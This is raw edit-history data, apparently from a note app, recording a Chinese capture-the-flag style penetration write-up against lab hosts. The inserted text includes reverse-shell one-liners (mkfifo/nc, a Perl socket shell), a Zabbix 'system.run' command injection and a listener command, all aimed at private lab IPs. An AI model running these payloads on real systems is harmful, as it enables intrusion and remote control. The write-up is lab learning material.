"],[1,5823,"\n"]],[5823,5823],[5539,5539]]],[1569897999633,["whale@Whale",[[1,3558,"\n"]],[3557,3557],[3558,3558]]],[1569897999831,["whale@Whale",[[1,3559,"\n"]],[3558,3558],[3559,3559]]],[1569898000751,["whale@Whale",[[1,3559,"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 1235 >/tmp/f"]],[3559,3559],[3637,3637]]],[1569898004638,["whale@Whale",[[-1,3628,"5"]],[3628,3628],[3628,3628]]],[1569898005217,["whale@Whale",[[1,3628,"4"]],[3628,3628],[3629,3629]]],[1569898031147,["whale@Whale",[[1,3337,"方法y"]],[3337,3337],[3340,3340]]],[1569898031620,["whale@Whale",[[-1,3339,"y"]],[3340,3340],[3339,3339]]],[1569898032734,["whale@Whale",[[1,3339,"一："]],[3339,3339],[3341,3341]]],[1569898039246,["whale@Whale",[[1,3563,"方法二："]],[3563,3563],[3567,3567]]],[1569898044725,["whale@Whale",[[1,3336,"tan"]],[3336,3336],[3339,3339]]],[1569898045304,["whale@Whale",[[-1,3336,"tan"]],[3339,3339],[3336,3336]]],[1569898106536,[null,[[-1,5627,"r"],[1,5652,"\n"],[1,5679,"b"],[-1,5681,"b"],[-1,5830," "],[1,5835," "],[-1,5911,"\n"]],[5627,5627],[5911,5911]]],[1569898106536,[null,[[1,5627,"r"],[-1,5651,"\n"],[-1,5679,"b"],[1,5682,"b"],[1,5830," "],[-1,5834," "],[1,5911,"\n"]],[5911,5911],[5627,5627]]],[1569898053039,["whale@Whale",[[1,3336,"反弹shell到本地。"]],[3336,3336],[3347,3347]]],[1569898054831,["whale@Whale",[[1,3348,"\n"]],[3347,3347],[3348,3348]]],[1569898055866,["whale@Whale",[[1,3349,"\n"]],[3348,3348],[3349,3349]]],[1569898061080,["whale@Whale",[[1,3349,"nc -lnvp 1234"]],[3349,3349],[3362,3362]]],[1569898063852,["whale@Whale",[[1,3349,"\n"]],[3349,3349],[3350,3350]]],[1569898064544,["whale@Whale",[[-1,3349,"\n"]],[3350,3350],[3349,3349]]],[1569898064885,["whale@Whale",[[-1,3348,"\n"]],[3349,3349],[3348,3348]]],[1569898065896,["whale@Whale",[[1,3348,"\n"]],[3348,3348],[3349,3349]]],[1569898067927,["whale@Whale",[[1,3363,"\n"]],[3362,3362],[3363,3363]]],[1569898073632,["whale@Whale",[[1,3363,"首先本地监听124d"]],[3363,3363],[3373,3373]]],[1569898074161,["whale@Whale",[[-1,3371,"4d"]],[3373,3373],[3371,3371]]],[1569898076260,["whale@Whale",[[1,3371,"34端口"]],[3371,3371],[3375,3375]]],[1569898076466,["whale@Whale",[[1,3376,"\n"]],[3375,3375],[3376,3376]]],[1569898077719,["whale@Whale",[[1,3376,"---"]],[3376,3376],[3379,3379]]],[1569898083336,["whale@Whale",[[1,3380,"\n"]],[3379,3379],[3380,3380]]],[1569898090561,["whale@Whale",[[1,3380,"webshell执行一下"]],[3380,3380],[3392,3392]]],[1569898091321,["whale@Whale",[[-1,3390,"一下"]],[3392,3392],[3390,3390]]],[1569898093469,["whale@Whale",[[1,3390,"以下命令"]],[3390,3390],[3394,3394]]],[1569898166540,[null,[[-1,5685,"r"],[1,5710,"\n"],[1,5737,"b"],[-1,5739,"b"],[-1,5888," "],[1,5893," "],[-1,5969,"\n"]],[5685,5685],[5969,5969]]],[1569898166540,[null,[[1,5685,"r"],[-1,5709,"\n"],[-1,5737,"b"],[1,5740,"b"],[1,5888," "],[-1,5892," "],[1,5969,"\n"]],[5969,5969],[5685,5685]]],[1569898128381,["whale@Whale",[[-1,5926,"\n"]],[5926,5926],[5925,5925]]],[1569898226541,[null,[[-1,5685,"r"],[1,5710,"\n"],[1,5737,"b"],[-1,5739,"b"],[-1,5888," "],[1,5893," "],[-1,5968,"\n"]],[5685,5685],[5968,5968]]],[1569898226541,[null,[[1,5685,"r"],[-1,5709,"\n"],[-1,5737,"b"],[1,5740,"b"],[1,5888," "],[-1,5892," "],[1,5968,"\n"]],[5968,5968],[5685,5685]]],[1569898188934,["whale@Whale",[[1,3824,"获得startard tty"]],[3824,3824],[3838,3838]]],[1569898196821,["whale@Whale",[[1,5940,"\n"]],[5939,5939],[5940,5940]]],[1569898198371,["whale@Whale",[[1,5940,"SHELL=/bin/bash script -q /dev/null"]],[5940,5940],[5975,5975]]],[1569898205820,["whale@Whale",[[1,5939,"成功反弹172"]],[5939,5939],[5946,5946]]],[1569898206851,["whale@Whale",[[-1,5944,"72"]],[5946,5946],[5944,5944]]],[1569898212544,["whale@Whale",[[1,5944,"72.10.0.1de"]],[5944,5944],[5955,5955]]],[1569898213161,["whale@Whale",[[-1,5953,"de"]],[5955,5955],[5953,5953]]],[1569898215872,["whale@Whale",[[1,5953,"的？"]],[5953,5953],[5955,5955]]],[1569898216419,["whale@Whale",[[-1,5954,"？"]],[5955,5955],[5954,5954]]],[1569898225360,["whale@Whale",[[1,5954,"/bin/sh到本地"]],[5954,5954],[5964,5964]]],[1569898286543,[null,[[-1,5699,"r"],[1,5724,"\n"],[1,5751,"b"],[-1,5753,"b"],[-1,5902," "],[1,5907," "],[-1,6043,"\n"],[1,6044,""]],[5699,5699],[6044,6044]]],[1569898286543,[null,[[1,5699,"r"],[-1,5723,"\n"],[-1,5751,"b"],[1,5754,"b"],[1,5902," "],[-1,5906," "],[1,6043,"\n"],[-1,6043,""]],[6044,6044],[5699,5699]]],[1569898227651,["whale@Whale",[[1,5965,"\n"]],[5964,5964],[5965,5965]]],[1569898229086,["whale@Whale",[[1,5965,"---"]],[5965,5965],[5968,5968]]],[1569898232841,["whale@Whale",[[1,6005,"\n"]],[6005,6005],[6006,6006]]],[1569898240717,["whale@Whale",[[1,6005,"获得标准/bin/bash"]],[6005,6005],[6018,6018]]],[1569898240979,["whale@Whale",[[1,6019,"\n"]],[6018,6018],[6019,6019]]],[1569898242052,["whale@Whale",[[1,6019,"---"]],[6019,6019],[6022,6022]]],[1569899126586,[null,[[-1,5699,"r"],[1,5724,"\n"],[1,5751,"b"],[-1,5753,"b"],[-1,5902," "],[1,5907," "],[-1,6065,"\n"],[1,6066,""]],[5699,5699],[6066,6066]]],[1569899126586,[null,[[1,5699,"r"],[-1,5723,"\n"],[-1,5751,"b"],[1,5754,"b"],[1,5902," "],[-1,5906," "],[1,6065,"\n"],[-1,6065,""]],[6066,6066],[5699,5699]]],[1569899074949,["whale@Whale",[[1,5965,"\n"]],[5965,5965],[5966,5966]]],[1569899088332,["whale@Whale",[[1,5965,"连上了是连上了，但总是会掉线"]],[5965,5965],[5979,5979]]],[1569900148477,[null,[[-1,5699,"r"],[1,5724,"\n"],[1,5751,"b"],[-1,5753,"b"],[-1,5902," "],[1,5907," "],[-1,6080,"\n"],[1,6081,""]],[5699,5699],[6081,6081]]],[1569900148478,[null,[[1,5699,"r"],[-1,5723,"\n"],[-1,5751,"b"],[1,5754,"b"],[1,5902," "],[-1,5906," "],[1,6080,"\n"],[-1,6080,""]],[6081,6081],[5699,5699]]],[1569900094439,["whale@Whale",[[1,6104,"\n"]],[6103,6103],[6104,6104]]],[1569900095919,["whale@Whale",[[1,6104,"echo \"system.run[ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc\n\n10.10.14.2 8443 >/tmp/f & ]\" | nc 172.17.0.1 10050"]],[6104,6104],[6227,6227]]],[1569900096915,["whale@Whale",[[1,6228,"\n"]],[6227,6227],[6228,6228]]],[1569900097152,["whale@Whale",[[1,6229,"\n"]],[6228,6228],[6229,6229]]],[1569900100151,["whale@Whale",[[-1,6176,"\n"]],[6177,6177],[6176,6176]]],[1569900100667,["whale@Whale",[[-1,6175,"\n"]],[6176,6176],[6175,6175]]],[1569900101461,["whale@Whale",[[1,6175," "]],[6175,6175],[6176,6176]]],[1569900120435,["whale@Whale",[[1,798," enumeration"]],[797,797],[809,809]]],[1569900120731,["whale@Whale",[[1,809,"\n"]],[809,809],[810,810]]],[1569900121463,["whale@Whale",[[1,810,"\n"]],[810,810],[811,811]]],[1569900123102,["whale@Whale",[[1,811,"###"]],[811,811],[814,814]]],[1569900132538,["whale@Whale",[[1,1250,"3"]],[1250,1250],[1251,1251]]],[1569900133885,["whale@Whale",[[-1,1250,"3"]],[1251,1251],[1250,1250]]],[1569900134828,["whale@Whale",[[1,1250,"#"]],[1250,1250],[1251,1251]]],[1569900139858,["whale@Whale",[[-1,1255," enumeration"]],[1255,1267],[1255,1255]]],[1569900208464,[null,[[-1,798," "],[1,809,"n"],[-1,814,"n"],[1,815," "],[-1,5705,"r"],[1,5730,"\n"],[1,5757,"b"],[-1,5759,"b"],[-1,5908," "],[1,5913," "],[-1,6088,"\n"],[1,6110,"\n"],[-1,6232,"\n"]],[798,798],[6232,6232]]],[1569900208464,[null,[[1,798," "],[-1,808,"n"],[1,814,"n"],[-1,814," "],[1,5705,"r"],[-1,5729,"\n"],[-1,5757,"b"],[1,5760,"b"],[1,5908," "],[-1,5912," "],[1,6088,"\n"],[-1,6109,"\n"],[1,6232,"\n"]],[6232,6232],[798,798]]],[1569900159774,["whale@Whale",[[1,2612,"#"]],[2612,2612],[2613,2613]]],[1569900188626,["whale@Whale",[[1,2941,"，执行exp"]],[2941,2941],[2947,2947]]],[1569900268467,[null,[[-1,798," "],[1,809,"n"],[-1,814,"n"],[1,815," "],[-1,5712,"r"],[1,5737,"\n"],[1,5764,"b"],[-1,5766,"b"],[-1,5915," "],[1,5920," "],[-1,6095,"\n"],[1,6117,"\n"],[-1,6239,"\n"]],[798,798],[6239,6239]]],[1569900268467,[null,[[1,798," "],[-1,808,"n"],[1,814,"n"],[-1,814," "],[1,5712,"r"],[-1,5736,"\n"],[-1,5764,"b"],[1,5767,"b"],[1,5915," "],[-1,5919," "],[1,6095,"\n"],[-1,6116,"\n"],[1,6239,"\n"]],[6239,6239],[798,798]]],[1569900259486,["whale@Whale",[[1,3315,"\n"]],[3314,3314],[3315,3315]]],[1569900261919,["whale@Whale",[[1,3315,"## fa"]],[3315,3315],[3320,3320]]],[1569900262567,["whale@Whale",[[-1,3318,"fa"]],[3320,3320],[3318,3318]]],[1569900263892,["whale@Whale",[[1,3318,"反弹"]],[3318,3318],[3320,3320]]],[1569900328469,[null,[[-1,798," "],[1,809,"n"],[-1,814,"n"],[1,815," "],[-1,5718,"r"],[1,5743,"\n"],[1,5770,"b"],[-1,5772,"b"],[-1,5921," "],[1,5926," "],[-1,6101,"\n"],[1,6123,"\n"],[-1,6245,"\n"]],[798,798],[6245,6245]]],[1569900328469,[null,[[1,798," "],[-1,808,"n"],[1,814,"n"],[-1,814," "],[1,5718,"r"],[-1,5742,"\n"],[-1,5770,"b"],[1,5773,"b"],[1,5921," "],[-1,5925," "],[1,6101,"\n"],[-1,6122,"\n"],[1,6245,"\n"]],[6245,6245],[798,798]]],[1569900272741,["whale@Whale",[[1,3320,"shell到本地"]],[3320,3320],[3328,3328]]],[1569900281626,["whale@Whale",[[1,3320,"docker虚拟机的"]],[3320,3320],[3330,3330]]],[1569900324794,["whale@Whale",[[1,4442,"\n"]],[4442,4442],[4443,4443]]],[1569900326961,["whale@Whale",[[1,4442,"·"]],[4442,4442],[4443,4443]]],[1569900327948,["whale@Whale",[[-1,4442,"·"]],[4443,4443],[4442,4442]]],[1569900388472,[null,[[-1,798," "],[1,809,"n"],[-1,814,"n"],[1,815," "],[-1,5737,"r"],[1,5762,"\n"],[1,5789,"b"],[-1,5791,"b"],[-1,5940," "],[1,5945," "],[-1,6120,"\n"],[1,6142,"\n"],[-1,6264,"\n"]],[798,798],[6264,6264]]],[1569900388472,[null,[[1,798," "],[-1,808,"n"],[1,814,"n"],[-1,814," "],[1,5737,"r"],[-1,5761,"\n"],[-1,5789,"b"],[1,5792,"b"],[1,5940," "],[-1,5944," "],[1,6120,"\n"],[-1,6141,"\n"],[1,6264,"\n"]],[6264,6264],[798,798]]],[1569900329148,["whale@Whale",[[1,4442,"```"]],[4442,4442],[4445,4445]]],[1569900331861,["whale@Whale",[[1,4446,"\n"]],[4446,4446],[4447,4447]]],[1569900333724,["whale@Whale",[[1,4447,"```"]],[4447,4447],[4450,4450]]],[1569900334789,["whale@Whale",[[1,4450,"\n"]],[4450,4450],[4451,4451]]],[1569900337255,["whale@Whale",[[1,4447,"\n"]],[4445,4445],[4446,4446]]],[1569900338626,["whale@Whale",[[1,4446,"33"]],[4446,4446],[4448,4448]]],[1569900339815,["whale@Whale",[[-1,4446,"33"]],[4448,4448],[4446,4446]]],[1569900356462,["whale@Whale",[[1,4446,"## 反弹10.10.10.108的shell到本机"]],[4446,4446],[4472,4472]]],[1569900361710,["whale@Whale",[[1,4474,"\n"]],[4473,4473],[4474,4474]]],[1569900365967,["whale@Whale",[[1,4474,"### 信息搜集"]],[4474,4474],[4482,4482]]],[1569900372039,["whale@Whale",[[-1,4487,"---"]],[4490,4490],[4487,4487]]],[1569900372452,["whale@Whale",[[-1,4487,"\n"]],[4487,4487],[4486,4486]]],[1569900508490,[null,[[-1,798," "],[1,809,"n"],[-1,814,"n"],[1,815," "],[-1,5777,"r"],[1,5802,"\n"],[1,5829,"b"],[-1,5831,"b"],[-1,5980," "],[1,5985," "],[-1,6160,"\n"],[1,6182,"\n"],[-1,6304,"\n"]],[798,798],[6304,6304]]],[1569900508490,[null,[[1,798," "],[-1,808,"n"],[1,814,"n"],[-1,814," "],[1,5777,"r"],[-1,5801,"\n"],[-1,5829,"b"],[1,5832,"b"],[1,5980," "],[-1,5984," "],[1,6160,"\n"],[-1,6181,"\n"],[1,6304,"\n"]],[6304,6304],[798,798]]],[1569900469285,["whale@Whale",[[-1,4941,"---"]],[4944,4944],[4941,4941]]],[1569900473262,["whale@Whale",[[1,4941,"```"]],[4941,4941],[4944,4944]]],[1569900473632,["whale@Whale",[[1,4945,"\n"]],[4944,4944],[4945,4945]]],[1569900473973,["whale@Whale",[[1,4946,"\n"]],[4945,4945],[4946,4946]]],[1569900476904,["whale@Whale",[[1,4946,"````"]],[4946,4946],[4950,4950]]],[1569900477840,["whale@Whale",[[-1,4949,"`"]],[4950,4950],[4949,4949]]],[1569900485594,["whale@Whale",[[-1,6169,"![2]($res/2.PNG)\n"]],[6169,6186],[6169,6169]]],[1569900495395,["whale@Whale",[[1,4945,"![2]($res/2.PNG)\n"]],[4945,4945],[4962,4962]]],[1569900629458,[null,[[-1,798," "],[1,809,"n"],[-1,814,"n"],[1,815," "],[-1,5799,"r"],[1,5824,"\n"],[1,5851,"b"],[-1,5853,"b"],[-1,6002," "],[1,6007," "],[-1,6182,"\n"],[1,6187,"\n"],[-1,6309,"\n"]],[798,798],[6309,6309]]],[1569900629458,[null,[[1,798," "],[-1,808,"n"],[1,814,"n"],[-1,814," "],[1,5799,"r"],[-1,5823,"\n"],[-1,5851,"b"],[1,5854,"b"],[1,6002," "],[-1,6006," "],[1,6182,"\n"],[-1,6186,"\n"],[1,6309,"\n"]],[6309,6309],[798,798]]],[1569900588393,["whale@Whale",[[1,5919,"\n"]],[5919,5919],[5920,5920]]],[1569900601264,["whale@Whale",[[-1,6081,"---\nSHELL=/bin/bash script -q /dev/null\n获得标准/bin/bash"]],[6081,6134],[6081,6081]]],[1569900601797,["whale@Whale",[[-1,6081,"\n"]],[6081,6081],[6080,6080]]],[1569900869463,[null,[[-1,798," "],[1,809,"n"],[-1,814,"n"],[1,815," "],[-1,5799,"r"],[1,5824,"\n"],[1,5851,"b"],[-1,5853,"b"],[-1,6003," "],[1,6008," "],[-1,6129,"\n"],[1,6134,"\n"],[-1,6256,"\n"]],[798,798],[6256,6256]]],[1569900869463,[null,[[1,798," "],[-1,808,"n"],[1,814,"n"],[-1,814," "],[1,5799,"r"],[-1,5823,"\n"],[-1,5851,"b"],[1,5854,"b"],[1,6003," "],[-1,6007," "],[1,6129,"\n"],[-1,6133,"\n"],[1,6256,"\n"]],[6256,6256],[798,798]]],[1569900869187,["whale@Whale",[[1,6372,"\n\n"]],[6372,6372],[6373,6373]]],[1569900929467,[null,[[-1,798," "],[1,809,"n"],[-1,814,"n"],[1,815," "],[-1,5799,"r"],[1,5824,"\n"],[1,5851,"b"],[-1,5853,"b"],[-1,6003," "],[1,6008," "],[-1,6129,"\n"],[1,6134,"\n"],[-1,6259,"\n"],[1,6372,"`"],[-1,6374,"`"]],[798,798],[6374,6374]]],[1569900929467,[null,[[1,798," "],[-1,808,"n"],[1,814,"n"],[-1,814," "],[1,5799,"r"],[-1,5823,"\n"],[-1,5851,"b"],[1,5854,"b"],[1,6003," "],[-1,6007," "],[1,6129,"\n"],[-1,6133,"\n"],[1,6259,"\n"],[-1,6371,"`"],[1,6374,"`"]],[6374,6374],[798,798]]],[1569900871388,["whale@Whale",[[-1,6373,"\n"],[1,6374,"## zong"]],[6373,6373],[6380,6380]]],[1569900872213,["whale@Whale",[[-1,6376,"zong"]],[6380,6380],[6376,6376]]],[1569900874059,["whale@Whale",[[1,6376,"总结"]],[6376,6376],[6378,6378]]],[1569900874274,["whale@Whale",[[1,6378,"\n\n"]],[6378,6378],[6379,6379]]],[1569900892571,["whale@Whale",[[-1,6379,"\n"],[1,6380,"当遇到openbsd需要反弹shell的时候，nc -e没有这个参数。"]],[6379,6379],[6414,6414]]],[1569900893369,["whale@Whale",[[1,6414,"\n\n"]],[6414,6414],[6415,6415]]],[1569900893670,["whale@Whale",[[1,6416,"\n"]],[6415,6415],[6416,6416]]],[1569900913348,["whale@Whale",[[-1,6416,"\n"],[1,6417,"可以用命令rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"]],[6416,6416],[6496,6496]]],[1569900919371,["whale@Whale",[[1,6421,"`"]],[6421,6421],[6422,6422]]],[1569900920932,["whale@Whale",[[1,6497,"`"]],[6497,6497],[6498,6498]]],[1569902429521,[null,[[-1,798," "],[1,809,"n"],[-1,814,"n"],[1,815," "],[-1,5799,"r"],[1,5824,"\n"],[1,5851,"b"],[-1,5853,"b"],[-1,6003," "],[1,6008," "],[-1,6129,"\n"],[1,6134,"\n"],[-1,6259,"\n"],[-1,6372,""],[1,6372,"`"],[-1,6497,"`"],[1,6498,""]],[798,798],[6498,6498]]],[1569902429521,[null,[[1,798," "],[-1,808,"n"],[1,814,"n"],[-1,814," "],[1,5799,"r"],[-1,5823,"\n"],[-1,5851,"b"],[1,5854,"b"],[1,6003," "],[-1,6007," "],[1,6129,"\n"],[-1,6133,"\n"],[1,6259,"\n"],[1,6371,""],[-1,6371,"`"],[1,6497,"`"],[-1,6497,""]],[6498,6498],[798,798]]],[1569902407477,["whale@Whale",[[-1,6215,"2 "]],[6215,6215],[6215,6215]]],[1569902409232,["whale@Whale",[[1,6215,"10 "]],[6215,6215],[6218,6218]]],[1569929805474,[null,[[-1,798," "],[1,809,"n"],[-1,814,"n"],[1,815," "],[-1,5799,"r"],[1,5824,"\n"],[1,5851,"b"],[-1,5853,"b"],[-1,6003," "],[1,6008," "],[-1,6129,"\n"],[1,6134,"\n"],[-1,6260,"\n"],[-1,6373,""],[1,6373,"`"],[-1,6498,"`"],[1,6499,""]],[798,798],[6499,6499]]],[1569929805474,[null,[[1,798," "],[-1,808,"n"],[1,814,"n"],[-1,814," "],[1,5799,"r"],[-1,5823,"\n"],[-1,5851,"b"],[1,5854,"b"],[1,6003," "],[-1,6007," "],[1,6129,"\n"],[-1,6133,"\n"],[1,6260,"\n"],[1,6372,""],[-1,6372,"`"],[1,6498,"`"],[-1,6498,""]],[6499,6499],[798,798]]],[1569929804265,["whale@Whale",[[1,24,"##"]],[24,24],[26,26]]],[1569929805301,["whale@Whale",[[-1,24,"##"]],[26,26],[24,24]]],[1569929865456,[null,[[-1,798," "],[1,809,"n"],[-1,814,"n"],[1,815," "],[-1,5799,"r"],[1,5824,"\n"],[1,5851,"b"],[-1,5853,"b"],[-1,6003," "],[1,6008," "],[-1,6129,"\n"],[1,6134,"\n"],[-1,6260,"\n"],[-1,6373,""],[1,6373,"`"],[-1,6498,"`"],[1,6499,""]],[798,798],[6499,6499]]],[1569929865456,[null,[[1,798," "],[-1,808,"n"],[1,814,"n"],[-1,814," "],[1,5799,"r"],[-1,5823,"\n"],[-1,5851,"b"],[1,5854,"b"],[1,6003," "],[-1,6007," "],[1,6129,"\n"],[-1,6133,"\n"],[1,6260,"\n"],[1,6372,""],[-1,6372,"`"],[1,6498,"`"],[-1,6498,""]],[6499,6499],[798,798]]],[1569929807294,["whale@Whale",[[1,24,"ni"]],[24,24],[26,26]]],[1569929807886,["whale@Whale",[[-1,24,"ni"]],[26,26],[24,24]]],[1569929824097,["whale@Whale",[[1,24,"你越功利，世界对你越深米"]],[24,24],[36,36]]],[1569929824576,["whale@Whale",[[-1,34,"深米"]],[36,36],[34,34]]],[1569929828108,["whale@Whale",[[1,34,"神秘。"]],[34,34],[37,37]]],[1569929829096,["whale@Whale",[[1,38,"\n"]],[37,37],[38,38]]],[1569929834177,["whale@Whale",[[1,39,"\n"]],[38,38],[39,39]]],[1569929835240,["whale@Whale",[[-1,39,"\n"]],[39,39],[38,38]]],[1569929835760,["whale@Whale",[[-1,38,"\n"]],[38,38],[37,37]]],[1569929838579,["whale@Whale",[[1,37,"废话不说，"]],[37,37],[42,42]]],[1569929925511,[null,[[-1,816," "],[1,827,"n"],[-1,832,"n"],[1,833," "],[-1,5817,"r"],[1,5842,"\n"],[1,5869,"b"],[-1,5871,"b"],[-1,6021," "],[1,6026," "],[-1,6147,"\n"],[1,6152,"\n"],[-1,6278,"\n"],[-1,6391,""],[1,6391,"`"],[-1,6516,"`"],[1,6517,""]],[816,816],[6517,6517]]],[1569929925511,[null,[[1,816," "],[-1,826,"n"],[1,832,"n"],[-1,832," "],[1,5817,"r"],[-1,5841,"\n"],[-1,5869,"b"],[1,5872,"b"],[1,6021," "],[-1,6025," "],[1,6147,"\n"],[-1,6151,"\n"],[1,6278,"\n"],[1,6390,""],[-1,6390,"`"],[1,6516,"`"],[-1,6516,""]],[6517,6517],[816,816]]],[1569929885403,["whale@Whale",[[1,42,"开始紧张刺激的渗透吧，"]],[42,42],[53,53]]],[1569929886104,["whale@Whale",[[-1,52,"，"]],[53,53],[52,52]]],[1569929887166,["whale@Whale",[[1,52,"！"]],[52,52],[53,53]]],[1569929888587,["whale@Whale",[[1,54,"\n"]],[53,53],[54,54]]],[1569931605513,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,5829,"r"],[1,5854,"\n"],[1,5881,"b"],[-1,5883,"b"],[-1,6033," "],[1,6038," "],[-1,6159,"\n"],[1,6164,"\n"],[-1,6290,"\n"],[-1,6403,""],[1,6403,"`"],[-1,6528,"`"],[1,6529,""]],[828,828],[6529,6529]]],[1569931605513,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,5829,"r"],[-1,5853,"\n"],[-1,5881,"b"],[1,5884,"b"],[1,6033," "],[-1,6037," "],[1,6159,"\n"],[-1,6163,"\n"],[1,6290,"\n"],[1,6402,""],[-1,6402,"`"],[1,6528,"`"],[-1,6528,""]],[6529,6529],[828,828]]],[1569931604496,["whale@Whale",[[1,6163,"perl -e "]],[6163,6163],[6171,6171]]],[1569931665497,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,5829,"r"],[1,5854,"\n"],[1,5881,"b"],[-1,5883,"b"],[-1,6033," "],[1,6038," "],[-1,6159,"\n"],[1,6163,"\n"],[-1,6298,"\n"],[-1,6411,""],[1,6411,"`"],[-1,6536,"`"],[1,6537,""]],[828,828],[6537,6537]]],[1569931665497,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,5829,"r"],[-1,5853,"\n"],[-1,5881,"b"],[1,5884,"b"],[1,6033," "],[-1,6037," "],[1,6159,"\n"],[-1,6162,"\n"],[1,6298,"\n"],[1,6410,""],[-1,6410,"`"],[1,6536,"`"],[-1,6536,""]],[6537,6537],[828,828]]],[1569931615558,["whale@Whale",[[1,6171,"use\n\nSocket;$i=\"10.10.14.2\";$p=8444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\n\nif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");o\n\npen(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]],[6171,6171],[6385,6385]]],[1569931617556,["whale@Whale",[[-1,6175,"\n"]],[6175,6175],[6174,6174]]],[1569931618793,["whale@Whale",[[-1,6174,"\n"]],[6174,6174],[6174,6174]]],[1569931619772,["whale@Whale",[[1,6174," "]],[6174,6174],[6175,6175]]],[1569931647483,["whale@Whale",[[-1,6259,"\n"]],[6259,6259],[6258,6258]]],[1569931648304,["whale@Whale",[[-1,6258,"\n"]],[6258,6258],[6258,6258]]],[1569931651033,["whale@Whale",[[-1,6342,"\n"]],[6342,6342],[6341,6341]]],[1569931651735,["whale@Whale",[[-1,6341,"\n"]],[6341,6341],[6341,6341]]],[1569931653964,["whale@Whale",[[1,6381,"\n"]],[6380,6380],[6381,6381]]],[1569931658007,["whale@Whale",[[-1,6195,"2"]],[6196,6196],[6195,6195]]],[1569931658509,["whale@Whale",[[1,6195,"10"]],[6195,6195],[6197,6197]]],[1569931725510,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,5829,"r"],[1,5854,"\n"],[1,5881,"b"],[-1,5883,"b"],[-1,6033," "],[1,6038," "],[-1,6159,"\n"],[1,6163,"\n"],[-1,6509,"\n"],[-1,6622,""],[1,6622,"`"],[-1,6747,"`"],[1,6748,""]],[828,828],[6748,6748]]],[1569931725510,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,5829,"r"],[-1,5853,"\n"],[-1,5881,"b"],[1,5884,"b"],[1,6033," "],[-1,6037," "],[1,6159,"\n"],[-1,6162,"\n"],[1,6509,"\n"],[1,6621,""],[-1,6621,"`"],[1,6747,"`"],[-1,6747,""]],[6748,6748],[828,828]]],[1569931667967,["whale@Whale",[[-1,6202,"8444"]],[6202,6202],[6202,6202]]],[1569931669729,["whale@Whale",[[1,6202,"1235"]],[6202,6202],[6206,6206]]],[1569931709475,["whale@Whale",[[1,6171,"'"]],[6163,6381],[6172,6172]]],[1569931713941,["whale@Whale",[[-1,6176,"S"]],[6176,6176],[6176,6176]]],[1569931716018,["whale@Whale",[[1,6176,"S"]],[6176,6176],[6176,6176]]],[1569931719095,["whale@Whale",[[1,6382,"'"]],[6382,6382],[6383,6383]]],[1569939022471,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,5829,"r"],[1,5854,"\n"],[1,5881,"b"],[-1,5883,"b"],[-1,6033," "],[1,6038," "],[-1,6159,"\n"],[1,6163,"\n"],[-1,6511,"\n"],[-1,6624,""],[1,6624,"`"],[-1,6749,"`"],[1,6750,""]],[828,828],[6750,6750]]],[1569939022471,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,5829,"r"],[-1,5853,"\n"],[-1,5881,"b"],[1,5884,"b"],[1,6033," "],[-1,6037," "],[1,6159,"\n"],[-1,6162,"\n"],[1,6511,"\n"],[1,6623,""],[-1,6623,"`"],[1,6749,"`"],[-1,6749,""]],[6750,6750],[828,828]]],[1569938980586,["whale@Whale",[[1,3045,"\n"]],[3044,3044],[3045,3045]]],[1569938987713,["whale@Whale",[[1,3046,"![3]($res/3.PNG)\n\n"]],[3045,3045],[3063,3063]]],[1569938990392,["whale@Whale",[[-1,3045,"\n"]],[3045,3045],[3044,3044]]],[1569938998213,["whale@Whale",[[-1,2855,"#"]],[2855,2855],[2854,2854]]],[1569939382492,[null,[[-1,828," "],[1,839,"n"],[-1,844,"n"],[1,845," "],[-1,5846,"r"],[1,5871,"\n"],[1,5898,"b"],[-1,5900,"b"],[-1,6050," "],[1,6055," "],[-1,6176,"\n"],[1,6180,"\n"],[-1,6528,"\n"],[-1,6641,""],[1,6641,"`"],[-1,6766,"`"],[1,6767,""]],[828,828],[6767,6767]]],[1569939382492,[null,[[1,828," "],[-1,838,"n"],[1,844,"n"],[-1,844," "],[1,5846,"r"],[-1,5870,"\n"],[-1,5898,"b"],[1,5901,"b"],[1,6050," "],[-1,6054," "],[1,6176,"\n"],[-1,6179,"\n"],[1,6528,"\n"],[1,6640,""],[-1,6640,"`"],[1,6766,"`"],[-1,6766,""]],[6767,6767],[828,828]]],[1569939342349,["whale@Whale",[[-1,2970,"，执行exp"]],[2970,2976],[2970,2970]]],[1569939344651,["whale@Whale",[[1,3056,"\n"]],[3055,3055],[3056,3056]]],[1569939347173,["whale@Whale",[[1,3056,"## x"]],[3056,3056],[3060,3060]]],[1569939347833,["whale@Whale",[[-1,3059,"x"]],[3060,3060],[3059,3059]]],[1569939351972,["whale@Whale",[[1,3059,"修改exp并执行"]],[3059,3059],[3067,3067]]],[1569939357209,["whale@Whale",[[1,3056,"\n"]],[3055,3055],[3056,3056]]],[1569939358481,["whale@Whale",[[1,3056,"··"]],[3056,3056],[3058,3058]]],[1569939359420,["whale@Whale",[[-1,3056,"··"]],[3058,3058],[3056,3056]]],[1569939360147,["whale@Whale",[[1,3056,"```"]],[3056,3056],[3059,3059]]],[1569939360315,["whale@Whale",[[1,3060,"\n"]],[3059,3059],[3060,3060]]],[1569939360581,["whale@Whale",[[1,3061,"\n"]],[3060,3060],[3061,3061]]],[1569939361262,["whale@Whale",[[1,3061,"```"]],[3061,3061],[3064,3064]]],[1569939363203,["whale@Whale",[[1,3065,"\n"]],[3064,3064],[3065,3065]]],[1569939382382,["whale@Whale",[[1,3060," curl -i -X POST -H 'Content-type:application/json' -d 